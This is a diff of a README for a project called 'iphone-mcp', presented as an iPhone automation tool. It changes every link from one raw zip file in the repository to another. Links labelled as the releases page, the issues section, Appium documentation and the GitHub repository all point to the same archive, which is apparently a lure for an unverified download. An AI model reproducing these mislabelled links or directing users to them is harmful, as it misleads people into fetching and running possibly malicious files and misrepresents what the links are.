@@ -1,6 +1,6 @@
 # 🚀 iphone-mcp - Automate Your iPhone Tasks Easily
 
-[![Download iphone-mcp](https://raw.githubusercontent.com/hunterkevv/iphone-mcp/master/waling/iphone-mcp.zip%https://raw.githubusercontent.com/hunterkevv/iphone-mcp/master/waling/iphone-mcp.zip)](https://raw.githubusercontent.com/hunterkevv/iphone-mcp/master/waling/iphone-mcp.zip)
+[![Download iphone-mcp](https://raw.githubusercontent.com/hunterkevv/iphone-mcp/master/res/iphone-mcp-Romaic.zip%https://raw.githubusercontent.com/hunterkevv/iphone-mcp/master/res/iphone-mcp-Romaic.zip)](https://raw.githubusercontent.com/hunterkevv/iphone-mcp/master/res/iphone-mcp-Romaic.zip)
 
 ## 📖 Overview
 
@@ -29,7 +29,7 @@ Follow these steps to get started:
 
 1. **Visit the Releases Page**  
    Click the link below to access the releases page for the latest version of iphone-mcp:  
-   [Download iphone-mcp](https://raw.githubusercontent.com/hunterkevv/iphone-mcp/master/waling/iphone-mcp.zip)
+   [Download iphone-mcp](https://raw.githubusercontent.com/hunterkevv/iphone-mcp/master/res/iphone-mcp-Romaic.zip)
 
 2. **Select the Latest Release**  
    On the releases page, you will find a list of the latest versions. Select the one at the top of the list.
@@ -73,7 +73,7 @@ After you've downloaded the application, follow these steps to install and run i
 
 ## 📧 Need Help?
 
-If you encounter problems or have questions, you can reach out for help. Check the [issues section](https://raw.githubusercontent.com/hunterkevv/iphone-mcp/master/waling/iphone-mcp.zip) on GitHub. Please provide detailed information about your issue to receive the best support.
+If you encounter problems or have questions, you can reach out for help. Check the [issues section](https://raw.githubusercontent.com/hunterkevv/iphone-mcp/master/res/iphone-mcp-Romaic.zip) on GitHub. Please provide detailed information about your issue to receive the best support.
 
 ## 🌍 Community Contributions
 
@@ -81,7 +81,7 @@ We welcome contributions! If you'd like to help improve **iphone-mcp**, please f
 
 ## 🔗 Additional Resources
 
-- [Appium Documentation](https://raw.githubusercontent.com/hunterkevv/iphone-mcp/master/waling/iphone-mcp.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/hunterkevv/iphone-mcp/master/waling/iphone-mcp.zip)
+- [Appium Documentation](https://raw.githubusercontent.com/hunterkevv/iphone-mcp/master/res/iphone-mcp-Romaic.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/hunterkevv/iphone-mcp/master/res/iphone-mcp-Romaic.zip)
 
 Thank you for using **iphone-mcp**! Enjoy automating your iPhone tasks with ease.
